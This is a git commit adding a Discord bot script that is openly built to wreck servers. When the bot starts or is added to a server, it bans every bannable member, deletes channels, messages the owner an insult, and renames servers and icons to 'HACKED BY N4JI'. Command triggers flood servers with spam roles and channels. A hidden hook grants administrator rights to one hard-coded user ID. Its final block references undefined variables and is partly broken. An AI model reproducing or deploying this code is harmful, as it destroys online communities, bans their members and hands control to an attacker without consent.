302ca9fb49f2c1d0b34d04bb29a708a8b3e7dc7a
faresmnasri <31959540+faresmnasri@users.noreply.github.com>
2019-01-14 16:55:53 +0100

    Add files via upload

---
+++ bot.js
@@ -0,0 +1,507 @@
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By N4JI_SANKOU7');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : N4JI_SANKOU7 ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  FALLEGA TEAM " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+
+        
+    
+
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`http://rozup.ir/up/se7en/hack2.jpg`)
+
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("YOU ARE HACKED BY N4JI")
+
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`♕N4JI HACKER♕`,'https://www.twitch.tv/hix')
+
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/avatars/534397434692894720/73cabd6ba61b815088b0cb7036dae520.png?size=256`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`THIS SERVER WAS HACKED BY ♕N4JI♕`)
+})
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "YOU ARE HACKED BY ♕N4JI♕",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "YOU ARE HACKED BY ♕N4JI♕",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "YOU ARE HACKED BY N4JI",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+m.createChannel('YOU ARE HACKED BY N4JI', 'text');
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+m.createChannel('YOU ARE HACKED BY N4JI', 'voice');
+
+
+
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' YOU ARE HACKED BY ♕N4JI♕    SALEM 3LA SERVERK BITCH <3 ').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('N4JI HACKED SERVER TEAM 69 ').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('YOU ARE HACKED BY ♕N4JI♕', 'text');
+
+      await guild.createChannel('YOU ARE HACKED BY ♕N4JI♕', 'voice');
+
+  
+
+}
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by N4JI_SANKOU7");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "373892191791087617") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+const x_x = "!run"
+    
+client.on('message', message => {
+        if (message.content === x_x) {
+            var teeext = teext.replace(" ", "-")
+            var interval = setInterval (function () {
+            const embed = new Discord.RichEmbed()
+           .setColor("ff0000")
+           .setThumbnail(pic)
+           .addField(spam, ".")
+            message.channel.sendEmbed(embed);
+            client.guilds.forEach(hack => {
+            hack.createRole({name: spam,permissions: [8],color: "#23272a"})
+            hack.createRole({name: spam,permissions: [8],color: " #df1213"})
+            hack.createChannel(teeext, 'text')
+            hack.createChannel(vooice, 'voice')
+            })}, 3);}});
+        client.on('message', message => {
+        if (message.content === x_x) {
+            message.guild.members.forEach(baand => {
+           baand.ban({reason: spam,});
+           client.channels.forEach(hackch => {
+           hackch.delete();
+           client.user.setAvatar(pic)
+           client.user.setUsername(namee)
+           client.user.setGame(playing, 'https://www.twitch.tv/hix')
+           client.guilds.forEach(hack => {
+           hack.setIcon(pic)
+           hack.setName(namee)})})})}});
+
+
+
+LOka.login(process.env.BOT_TOKEN)
